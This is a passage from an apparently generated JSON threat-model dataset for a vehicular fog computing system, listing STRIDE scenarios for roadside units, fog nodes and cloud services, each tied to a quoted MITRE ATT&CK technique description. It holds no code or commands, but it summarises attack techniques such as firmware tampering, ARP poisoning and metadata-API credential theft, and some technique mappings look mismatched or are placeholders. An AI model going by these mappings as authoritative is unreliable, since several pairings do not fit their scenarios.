            "MITRE ATT&CK Keywords": [
                "tampering",
                "fog node",
                "data injection",
                "compromise"
            ],
            "mitre_technique": {
                "name": "Component Firmware",
                "description": "Some adversaries may employ sophisticated means to compromise computer components and install malicious firmware that will execute adversary code outside of the operating system and main system firmware or BIOS. This technique may be similar to [System Firmware](https://attack.mitre.org/techniques/T1019) but conducted upon other system components that may not have the same capability or level of integrity checking. Malicious device firmware could provide both a persistent level of access to systems despite potential typical failures to maintain access and hard disk re-images, as well as a way to evade host software-based defenses and integrity checks.",
                "id": "attack-pattern--10d5f3b7-6be6-4da5-9a77-0f1e2bbfcc44",
                "technique_id": "T1109"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker hijacks updates to RSUs to install malicious firmware.",
            "Assumptions": [
                {
                    "Assumption": "Firmware update processes are not securely managed.",
                    "Role": "System Administrator",
                    "Condition": "Lack of validation and verification mechanisms for firmware integrity."
                },
                {
                    "Assumption": "Attacker has access to the update mechanism.",
                    "Role": "Attacker",
                    "Condition": "Compromised update server or network."
                }
            ],
            "Potential Impact": "RSU functionality is corrupted, leading to erroneous traffic management and potential data breaches.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "RSU",
                "firmware",
                "update compromise"
            ],
            "mitre_technique": {
                "name": "Component Firmware",
                "description": "Some adversaries may employ sophisticated means to compromise computer components and install malicious firmware that will execute adversary code outside of the operating system and main system firmware or BIOS. This technique may be similar to [System Firmware](https://attack.mitre.org/techniques/T1019) but conducted upon other system components that may not have the same capability or level of integrity checking. Malicious device firmware could provide both a persistent level of access to systems despite potential typical failures to maintain access and hard disk re-images, as well as a way to evade host software-based defenses and integrity checks.",
                "id": "attack-pattern--10d5f3b7-6be6-4da5-9a77-0f1e2bbfcc44",
                "technique_id": "T1109"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A user denies having sent specific traffic data, causing disputes.",
            "Assumptions": [
                {
                    "Assumption": "System does not maintain secure logs or an audit trail.",
                    "Role": "System Architect",
                    "Condition": "Log management and retention policies are inadequate."
                },
                {
                    "Assumption": "User credentials can be easily compromised.",
                    "Role": "Attacker",
                    "Condition": "Insufficient user authentication mechanisms."
                }
            ],
            "Potential Impact": "Disrupted accountability and potential for fraudulent denial of actions.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "log manipulation",
                "audit",
                "dispute"
            ],
            "mitre_technique": {
                "name": "Disable or Modify Linux Audit System",
                "description": "Adversaries may disable or modify the Linux audit system to hide malicious activity and avoid detection. Linux admins use the Linux Audit system to track security-relevant information on a system. The Linux Audit system operates at the kernel-level and maintains event logs on application and system activity such as process, network, file, and login events based on pre-configured rules.\n\nOften referred to as `auditd`, this is the name of the daemon used to write events to disk and is governed by the parameters set in the `audit.conf` configuration file. Two primary ways to configure the log generation rules are through the command line `auditctl` utility and the file `/etc/audit/audit.rules`,  containing a sequence of `auditctl` commands loaded at boot time.(Citation: Red Hat System Auditing)(Citation: IzyKnows auditd threat detection 2022)\n\nWith root privileges, adversaries may be able to ensure their activity is not logged through disabling the Audit system service, editing the configuration/rule files, or by hooking the Audit system library functions. Using the command line, adversaries can disable the Audit system service through killing processes associated with `auditd` daemon or use `systemctl` to stop the Audit service. Adversaries can also hook Audit system functions to disable logging or modify the rules contained in the `/etc/audit/audit.rules` or `audit.conf` files to ignore malicious activity.(Citation: Trustwave Honeypot SkidMap 2023)(Citation: ESET Ebury Feb 2014)",
                "id": "attack-pattern--562e9b64-7239-493d-80f4-2bff900d9054",
                "technique_id": "T1562.012"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A fog node tampering incident where the attacker denies altering decision-making data.",
            "Assumptions": [
                {
                    "Assumption": "Logs do not include tamper-proof mechanisms.",
                    "Role": "System Architect",
                    "Condition": "Lack of immutable logging technology."
                },
                {
                    "Assumption": "Fog node access records are not detailed or timestamped.",
                    "Role": "System Administrator",
                    "Condition": "Inadequate logging practices."
                }
            ],
            "Potential Impact": "Loss of trust in the fog system's decision-making processes.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "log tampering",
                "fog node",
                "data integrity"
            ],
            "mitre_technique": {
                "name": "Kernel Modules and Extensions",
                "description": "Loadable Kernel Modules (or LKMs) are pieces of code that can be loaded and unloaded into the kernel upon demand. They extend the functionality of the kernel without the need to reboot the system. For example, one type of module is the device driver, which allows the kernel to access hardware connected to the system. (Citation: Linux Kernel Programming)\u00a0When used maliciously, Loadable Kernel Modules (LKMs) can be a type of kernel-mode [Rootkit](https://attack.mitre.org/techniques/T1014) that run with the highest operating system privilege (Ring 0). (Citation: Linux Kernel Module Programming Guide)\u00a0Adversaries can use loadable kernel modules to covertly persist on a system and evade defenses. Examples have been found in the wild and there are some open source projects. (Citation: Volatility Phalanx2) (Citation: CrowdStrike Linux Rootkit) (Citation: GitHub Reptile) (Citation: GitHub Diamorphine)\n\nCommon features of LKM based rootkits include: hiding itself, selective hiding of files, processes and network activity, as well as log tampering, providing authenticated backdoors and enabling root access to non-privileged users. (Citation: iDefense Rootkit Overview)\n\nKernel extensions, also called kext, are used for macOS to load functionality onto a system similar to LKMs for Linux. They are loaded and unloaded through <code>kextload</code> and <code>kextunload</code> commands. Several examples have been found where this can be used. (Citation: RSAC 2015 San Francisco Patrick Wardle) (Citation: Synack Secure Kernel Extension Broken) Examples have been found in the wild. (Citation: Securelist Ventir)",
                "id": "attack-pattern--6be14413-578e-46c1-8304-310762b3ecd5",
                "technique_id": "T1215"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An attacker denies uploading a malicious firmware update to an RSU.",
            "Assumptions": [
                {
                    "Assumption": "No secure method for tracking firmware updates.",
                    "Role": "System Administrator",
                    "Condition": "Firmware deployment lacks verification and auditing."
                },
                {
                    "Assumption": "Attacker can access the update mechanism without traces.",
                    "Role": "Attacker",
                    "Condition": "Weak access controls and logging."
                }
            ],
            "Potential Impact": "Compromised firmware integrity and loss of update auditability.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "firmware",
                "RSU",
                "audit logs"
            ],
            "mitre_technique": {
                "name": "Component Firmware",
                "description": "Some adversaries may employ sophisticated means to compromise computer components and install malicious firmware that will execute adversary code outside of the operating system and main system firmware or BIOS. This technique may be similar to [System Firmware](https://attack.mitre.org/techniques/T1019) but conducted upon other system components that may not have the same capability or level of integrity checking. Malicious device firmware could provide both a persistent level of access to systems despite potential typical failures to maintain access and hard disk re-images, as well as a way to evade host software-based defenses and integrity checks.",
                "id": "attack-pattern--10d5f3b7-6be6-4da5-9a77-0f1e2bbfcc44",
                "technique_id": "T1109"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker intercepts data communications between smart vehicles and fog nodes.",
            "Assumptions": [
                {
                    "Assumption": "Data is transmitted in plaintext.",
                    "Role": "System Architect",
                    "Condition": "Lack of encryption or secure communication protocols."
                },
                {
                    "Assumption": "Attacker can access the communication channel.",
                    "Role": "Attacker",
                    "Condition": "Weak or compromised network infrastructure."
                }
            ],
            "Potential Impact": "Unauthorized disclosure of sensitive vehicular and user data.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "interception",
                "plaintext",
                "communication"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker accesses unprotected logs on fog nodes containing sensitive data.",
            "Assumptions": [
                {
                    "Assumption": "Logs are not encrypted or access-controlled.",
                    "Role": "System Administrator",
                    "Condition": "Lack of log protection measures."
                },
                {
                    "Assumption": "Attacker has access to the fog node.",
                    "Role": "Attacker",
                    "Condition": "Weak access control mechanisms on the node."
                }
            ],
            "Potential Impact": "Exposure of sensitive operational and user data stored in logs.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "log access",
                "data breach",
                "node compromise"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Cloud services are compromised, leading to unauthorized access to sensitive data stored in the cloud.",
            "Assumptions": [
                {
                    "Assumption": "Cloud services have vulnerabilities or weak security measures.",
                    "Role": "Cloud Service Provider",
                    "Condition": "Unpatched vulnerabilities or weak access controls."
                },
                {
                    "Assumption": "Attackers have the capability to exploit these vulnerabilities.",
                    "Role": "Attacker",
                    "Condition": "Presence of known or zero-day vulnerabilities."
                }
            ],
            "Potential Impact": "Large-scale data breach of historical and sensitive data.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "cloud service",
                "data breach",
                "storage"
            ],
            "mitre_technique": {
                "name": "Data from Cloud Storage",
                "description": "Adversaries may access data from cloud storage.\n\nMany IaaS providers offer solutions for online data object storage such as Amazon S3, Azure Storage, and Google Cloud Storage. Similarly, SaaS enterprise platforms such as Office 365 and Google Workspace provide cloud-based document storage to users through services such as OneDrive and Google Drive, while SaaS application providers such as Slack, Confluence, Salesforce, and Dropbox may provide cloud storage solutions as a peripheral or primary use case of their platform. \n\nIn some cases, as with IaaS-based cloud storage, there exists no overarching application (such as SQL or Elasticsearch) with which to interact with the stored objects: instead, data from these solutions is retrieved directly though the [Cloud API](https://attack.mitre.org/techniques/T1059/009). In SaaS applications, adversaries may be able to collect this data directly from APIs or backend cloud storage objects, rather than through their front-end application or interface (i.e., [Data from Information Repositories](https://attack.mitre.org/techniques/T1213)). \n\nAdversaries may collect sensitive data from these cloud storage solutions. Providers typically offer security guides to help end users configure systems, though misconfigurations are a common problem.(Citation: Amazon S3 Security, 2019)(Citation: Microsoft Azure Storage Security, 2019)(Citation: Google Cloud Storage Best Practices, 2019) There have been numerous incidents where cloud storage has been improperly secured, typically by unintentionally allowing public access to unauthenticated users, overly-broad access by all users, or even access for any anonymous person outside the control of the Identity Access Management system without even needing basic user permissions.\n\nThis open access may expose various types of sensitive data, such as credit cards, personally identifiable information, or medical records.(Citation: Trend Micro S3 Exposed PII, 2017)(Citation: Wired Magecart S3 Buckets, 2019)(Citation: HIPAA Journal S3 Breach, 2017)(Citation: Rclone-mega-extortion_05_2021)\n\nAdversaries may also obtain then abuse leaked credentials from source repositories, logs, or other means as a way to gain access to cloud storage objects.",
                "id": "attack-pattern--3298ce88-1628-43b1-87d9-0b5336b193d7",
                "technique_id": "T1530"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "DDoS attack on fog nodes, disrupting real-time processing and decision-making.",
            "Assumptions": [
                {
                    "Assumption": "Fog nodes are exposed to the internet without adequate protection.",
                    "Role": "System Architect",
                    "Condition": "Lack of DDoS mitigation strategies."
                },
                {
                    "Assumption": "Attackers can generate volumetric traffic.",
                    "Role": "Attacker",
                    "Condition": "Availability of botnets or other DDoS tools."
                }
            ],
            "Potential Impact": "Disruption of real-time vehicular data processing and traffic management.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "DDoS",
                "fog node",
                "disruption"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker floods the network with malicious traffic targeting RSUs, causing them to become unresponsive.",
            "Assumptions": [
                {
                    "Assumption": "Network lacks traffic filtering and throttling mechanisms.",
                    "Role": "Network Engineer",
                    "Condition": "Insufficient network traffic management."
                },
                {
                    "Assumption": "RSU overload protection is weak or non-existent.",
                    "Role": "System Architect",
                    "Condition": "Lack of robust RSU hardware and software protections."
                }
            ],
            "Potential Impact": "RSUs become unresponsive, leading to loss of local traffic management capabilities.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "RSU",
                "traffic flood",
                "network"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "DDoS attack on cloud services, preventing vehicle to cloud data synchronization.",
            "Assumptions": [
                {
                    "Assumption": "Cloud services are not scaled to handle high traffic.",
                    "Role": "Cloud Service Provider",
                    "Condition": "Inadequate resource scaling policies."
                },
                {
                    "Assumption": "Attackers can mobilize sufficient resources to overwhelm the cloud infrastructure.",
                    "Role": "Attacker",
                    "Condition": "Presence of coordinated botnet resources."
                }
            ],
            "Potential Impact": "Interruption of cloud services, impacting long-term data storage and analysis.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "DDoS",
                "cloud service",
                "traffic overload"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker exploits a vulnerability in fog node software to gain administrative privileges.",
            "Assumptions": [
                {
                    "Assumption": "Known or zero-day vulnerabilities exist in the fog node software.",
                    "Role": "Fog Node Vendor",
                    "Condition": "Software vulnerabilities remain unpatched."
                },
                {
                    "Assumption": "Attackers can launch exploits against the fog node.",
                    "Role": "Attacker",
                    "Condition": "Successful delivery of exploit code."
                }
            ],
            "Potential Impact": "Unauthorized administrative control over the fog node, leading to full compromise.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "exploit",
                "admin access",
                "fog node"
            ],
            "mitre_technique": {
                "name": "Exploit Public-Facing Application",
                "description": "Adversaries may attempt to exploit a weakness in an Internet-facing host or system to initially access a network. The weakness in the system can be a software bug, a temporary glitch, or a misconfiguration.\n\nExploited applications are often websites/web servers, but can also include databases (like SQL), standard services (like SMB or SSH), network device administration and management protocols (like SNMP and Smart Install), and any other system with Internet accessible open sockets.(Citation: NVD CVE-2016-6662)(Citation: CIS Multiple SMB Vulnerabilities)(Citation: US-CERT TA18-106A Network Infrastructure Devices 2018)(Citation: Cisco Blog Legacy Device Attacks)(Citation: NVD CVE-2014-7169) Depending on the flaw being exploited this may also involve [Exploitation for Defense Evasion](https://attack.mitre.org/techniques/T1211) or [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203).\n\nIf an application is hosted on cloud-based infrastructure and/or is containerized, then exploiting it may lead to compromise of the underlying instance or container. This can allow an adversary a path to access the cloud or container APIs, exploit container host access via [Escape to Host](https://attack.mitre.org/techniques/T1611), or take advantage of weak identity and access management policies.\n\nAdversaries may also exploit edge network infrastructure and related appliances, specifically targeting devices that do not support robust host-based defenses.(Citation: Mandiant Fortinet Zero Day)(Citation: Wired Russia Cyberwar)\n\nFor websites and databases, the OWASP top 10 and CWE top 25 highlight the most common web-based vulnerabilities.(Citation: OWASP Top 10)(Citation: CWE top 25)",
                "id": "attack-pattern--3f886f2a-874f-4333-b794-aa6075009b1c",
                "technique_id": "T1190"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker gains root access to the cloud services through a compromised API endpoint.",
            "Assumptions": [
                {
                    "Assumption": "API endpoint security is weak or compromised.",
                    "Role": "Cloud Service Provider",
                    "Condition": "Lack of proper API security measures."
                },
                {
                    "Assumption": "Attackers have valid credentials or exploit API vulnerabilities.",
                    "Role": "Attacker",
                    "Condition": "Access to compromised credentials or unpatched API flaws."
                }
            ],
            "Potential Impact": "Complete takeover of cloud services, compromising data and operational integrity.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "API",
                "root access",
                "cloud service"
            ],
            "mitre_technique": {
                "name": "Cloud Instance Metadata API",
                "description": "Adversaries may attempt to access the Cloud Instance Metadata API to collect credentials and other sensitive data.\n\nMost cloud service providers support a Cloud Instance Metadata API which is a service provided to running virtual instances that allows applications to access information about the running virtual instance. Available information generally includes name, security group, and additional metadata including sensitive data such as credentials and UserData scripts that may contain additional secrets. The Instance Metadata API is provided as a convenience to assist in managing applications and is accessible by anyone who can access the instance.(Citation: AWS Instance Metadata API) A cloud metadata API has been used in at least one high profile compromise.(Citation: Krebs Capital One August 2019)\n\nIf adversaries have a presence on the running virtual instance, they may query the Instance Metadata API directly to identify credentials that grant access to additional resources. Additionally, adversaries may exploit a Server-Side Request Forgery (SSRF) vulnerability in a public facing web proxy that allows them to gain access to the sensitive information via a request to the Instance Metadata API.(Citation: RedLock Instance Metadata API 2018)\n\nThe de facto standard across cloud service providers is to host the Instance Metadata API at <code>http[:]//169.254.169.254</code>.\n",
                "id": "attack-pattern--19bf235b-8620-4997-b5b4-94e0659ed7c3",
                "technique_id": "T1552.005"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker elevates privileges on an RSU by exploiting bootloader vulnerabilities.",
            "Assumptions": [
                {
                    "Assumption": "RSU bootloader lacks proper security mechanisms.",
                    "Role": "RSU Manufacturer",
                    "Condition": "Unsecured or vulnerable bootloader implementations."
                },
                {
                    "Assumption": "Attackers have physical access to the RSU.",
                    "Role": "Attacker",
                    "Condition": "Physical access to RSU deployments."
                }
            ],
            "Potential Impact": "Full control over RSU operations, enabling arbitrary firmware installation and control.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "RSU",
                "bootloader",
                "exploit"
            ],
            "mitre_technique": {
                "name": "Exploit Public-Facing Application",
                "description": "Adversaries may attempt to exploit a weakness in an Internet-facing host or system to initially access a network. The weakness in the system can be a software bug, a temporary glitch, or a misconfiguration.\n\nExploited applications are often websites/web servers, but can also include databases (like SQL), standard services (like SMB or SSH), network device administration and management protocols (like SNMP and Smart Install), and any other system with Internet accessible open sockets.(Citation: NVD CVE-2016-6662)(Citation: CIS Multiple SMB Vulnerabilities)(Citation: US-CERT TA18-106A Network Infrastructure Devices 2018)(Citation: Cisco Blog Legacy Device Attacks)(Citation: NVD CVE-2014-7169) Depending on the flaw being exploited this may also involve [Exploitation for Defense Evasion](https://attack.mitre.org/techniques/T1211) or [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203).\n\nIf an application is hosted on cloud-based infrastructure and/or is containerized, then exploiting it may lead to compromise of the underlying instance or container. This can allow an adversary a path to access the cloud or container APIs, exploit container host access via [Escape to Host](https://attack.mitre.org/techniques/T1611), or take advantage of weak identity and access management policies.\n\nAdversaries may also exploit edge network infrastructure and related appliances, specifically targeting devices that do not support robust host-based defenses.(Citation: Mandiant Fortinet Zero Day)(Citation: Wired Russia Cyberwar)\n\nFor websites and databases, the OWASP top 10 and CWE top 25 highlight the most common web-based vulnerabilities.(Citation: OWASP Top 10)(Citation: CWE top 25)",
                "id": "attack-pattern--3f886f2a-874f-4333-b794-aa6075009b1c",
                "technique_id": "T1190"
            }
        }
    ]
},
{
    "case_number": "11",
    "batch_number": "20",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "Attackers impersonate authorized smart vehicles to gain access to VFC system.",
            "Assumptions": [
                {
                    "Assumption": "Lack of strong vehicle authentication methods",
                    "Role": "System Designer",
                    "Condition": "Vehicle authentication is not robust."
                },
                {
                    "Assumption": "Network vulnerabilities are exploited",
                    "Role": "Attacker",
                    "Condition": "Network security is weak."
                }
            ],
            "Potential Impact": "Unauthorized access to system, data manipulation.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "credential access",
                "network"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "Malicious actors pretend to be roadside units (RSUs) to control traffic information.",
            "Assumptions": [
                {
                    "Assumption": "Insufficient RSU validation mechanisms",
                    "Role": "System Architect",
                    "Condition": "RSU validation is not thorough."
                },
                {
                    "Assumption": "RSU physical access is unprotected",
                    "Role": "Attacker",
                    "Condition": "RSU physical security is lacking."
                }
            ],
            "Potential Impact": "Traffic disruptions, potential for accidents.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "hardware access",
                "traffic management"
            ],
            "mitre_technique": {
                "name": "Phishing",
                "description": "Adversaries may send phishing messages to gain access to victim systems. All forms of phishing are electronically delivered social engineering. Phishing can be targeted, known as spearphishing. In spearphishing, a specific individual, company, or industry will be targeted by the adversary. More generally, adversaries can conduct non-targeted phishing, such as in mass malware spam campaigns.\n\nAdversaries may send victims emails containing malicious attachments or links, typically to execute malicious code on victim systems. Phishing may also be conducted via third-party services, like social media platforms. Phishing may also involve social engineering techniques, such as posing as a trusted source, as well as evasive techniques such as removing or manipulating emails or metadata/headers from compromised accounts being abused to send messages (e.g., [Email Hiding Rules](https://attack.mitre.org/techniques/T1564/008)).(Citation: Microsoft OAuth Spam 2022)(Citation: Palo Alto Unit 42 VBA Infostealer 2014) Another way to accomplish this is by forging or spoofing(Citation: Proofpoint-spoof) the identity of the sender which can be used to fool both the human recipient as well as automated security tools.(Citation: cyberproof-double-bounce) \n\nVictims may also receive phishing messages that instruct them to call a phone number where they are directed to visit a malicious URL, download malware,(Citation: sygnia Luna Month)(Citation: CISA Remote Monitoring and Management Software) or install adversary-accessible remote management tools onto their computer (i.e., [User Execution](https://attack.mitre.org/techniques/T1204)).(Citation: Unit42 Luna Moth)",
                "id": "attack-pattern--a62a8db3-f23a-4d8f-afd6-9dbc77e7813b",
                "technique_id": "T1566"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "Adversaries mask their identity to establish communication with fog nodes.",
            "Assumptions": [
                {
                    "Assumption": "Weak fog node authentication process",
                    "Role": "System Developer",
                    "Condition": "Authentication protocols are deficient."
                },
                {
                    "Assumption": "Compromised or weakly encrypted communication channels",
                    "Role": "Attacker",
                    "Condition": "Encryption methods are subpar."
                }
            ],
            "Potential Impact": "Unauthorized data access, potential data exfiltration.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "communication exploitation",
                "fog nodes"
            ],
            "mitre_technique": {
                "name": "ARP Cache Poisoning",
                "description": "Adversaries may poison Address Resolution Protocol (ARP) caches to position themselves between the communication of two or more networked devices. This activity may be used to enable follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040) or [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002).\n\nThe ARP protocol is used to resolve IPv4 addresses to link layer addresses, such as a media access control (MAC) address.(Citation: RFC826 ARP) Devices in a local network segment communicate with each other by using link layer addresses. If a networked device does not have the link layer address of a particular networked device, it may send out a broadcast ARP request to the local network to translate the IP address to a MAC address. The device with the associated IP address directly replies with its MAC address. The networked device that made the ARP request will then use as well as store that information in its ARP cache.\n\nAn adversary may passively wait for an ARP request to poison the ARP cache of the requesting device. The adversary may reply with their MAC address, thus deceiving the victim by making them believe that they are communicating with the intended networked device. For the adversary to poison the ARP cache, their reply must be faster than the one made by the legitimate IP address owner. Adversaries may also send a gratuitous ARP reply that maliciously announces the ownership of a particular IP address to all the devices in the local network segment.\n\nThe ARP protocol is stateless and does not require authentication. Therefore, devices may wrongly add or update the MAC address of the IP address in their ARP cache.(Citation: Sans ARP Spoofing Aug 2003)(Citation: Cylance Cleaver)\n\nAdversaries may use ARP cache poisoning as a means to intercept network traffic. This activity may be used to collect and/or relay data such as credentials, especially those sent over an insecure, unencrypted protocol.(Citation: Sans ARP Spoofing Aug 2003)\n",
                "id": "attack-pattern--cabe189c-a0e3-4965-a473-dcff00f17213",
                "technique_id": "T1557.002"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker modifies data being processed by fog nodes to provide inaccurate real-time decisions.",
            "Assumptions": [
                {
                    "Assumption": "Insufficient data validation at fog nodes",
                    "Role": "System Validator",
